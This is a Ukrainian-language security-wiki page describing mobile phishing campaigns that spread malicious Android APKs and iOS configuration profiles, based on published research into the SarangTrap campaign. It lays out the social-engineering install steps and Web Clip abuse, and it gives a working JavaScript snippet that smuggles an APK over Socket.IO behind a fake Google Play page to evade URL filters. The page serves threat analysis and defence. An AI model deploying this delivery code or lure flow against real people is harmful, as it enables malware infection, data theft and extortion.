# Фішинг на мобільних пристроях і розповсюдження шкідливих застосунків (Android та iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> На цій сторінці описано методи, які використовують зловмисники для розповсюдження **шкідливих Android APK** і **профілів конфігурації iOS** через фішинг (SEO, соціальна інженерія, підроблені магазини, dating-застосунки тощо).
> Матеріал адаптовано з кампанії SarangTrap, викритої Zimperium zLabs (2025), а також з інших загальнодоступних досліджень.<sup>[[1]](#references)</sup>

## Схема атаки

1. **SEO/фішингова інфраструктура**
* Реєстрація десятків схожих доменів (dating, cloud share, car service тощо).
– Використання ключових слів місцевою мовою та emoji в елементі `<title>` для підвищення позицій у Google.
– Розміщення інструкцій зі встановлення як Android (`.apk`), так і iOS на одній landing page.
2. **Завантаження першого етапу**
* Android: пряме посилання на *unsigned* APK або APK із “third-party store”.
* iOS: `itms-services://` або звичайне HTTPS-посилання на шкідливий профіль **mobileconfig** (див. нижче).
3. **Поведінка Android після встановлення**
* Виконання, кероване C2, зловживання дозволами, обходи dropper, збір даних у background та інша поведінка malware після встановлення описані на окремій сторінці Android Malware Post-Exploitation нижче.
4. **Метод доставки для iOS**
* Один **профіль конфігурації mobile** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо для зарахування пристрою до нагляду, подібного до “MDM”.
* Інструкції із соціальної інженерії:
1. Відкрити Settings ➜ *Profile downloaded*.
2. Тричі натиснути *Install* (скриншоти розміщуються на фішинговій сторінці).
3. Довіритися unsigned профілю ➜ зловмисник отримує entitlement для *Contacts* і *Photo* без перевірки App Store.
5. **Web Clip Payload для iOS (іконка фішингового застосунку)**
* Payload-и `com.apple.webClip.managed` можуть **закріпити фішинговий URL на Home Screen** за допомогою брендованої іконки/мітки.
* Web Clips можуть запускатися **на весь екран** (приховуючи UI browser) і позначатися як **такі, що не видаляються**, змушуючи жертву видалити профіль для вилучення іконки.<sup>[[3]](#references)</sup>
6. **Мережевий рівень**
* Звичайний HTTP, часто на порту 80 із HOST header на кшталт `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (без TLS → легко виявити).

## Android Malware Post-Exploitation

Щодо tradecraft Android malware після встановлення, зокрема C2, зловживання Accessibility, overlays, ATS automation, staged DEX loading, premium SMS і persistence, дивіться:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Smuggling APK на основі Socket.IO/WebSocket + підроблені сторінки Google Play

Зловмисники дедалі частіше замінюють статичні посилання на APK каналом Socket.IO/WebSocket, вбудованим у приманки, що імітують Google Play. Це приховує URL payload, обходить фільтри URL/розширень і забезпечує реалістичний UX встановлення.<sup>[[2]](#references)[[4]](#references)</sup>

Типовий client flow, зафіксований у реальних атаках:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Чому це обходить прості засоби контролю:
- Статична URL-адреса APK не розкривається; payload відновлюється в пам'яті з WebSocket-фреймів.
- Фільтри URL/MIME/розширень, які блокують прямі відповіді з `.apk`, можуть пропустити бінарні дані, тунельовані через WebSockets/Socket.IO.
- Crawlers і URL sandbox-и, які не виконують WebSockets, не отримають payload.

Див. також tradecraft і засоби для WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Посилання

- [1] [The Dark Side of Romance: кампанія вимагання SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Налаштування payload Web Clips для пристроїв Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan, націлений на користувачів Android з Індонезії та В'єтнаму](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)

{{#include ../../banners/hacktricks-training.md}}
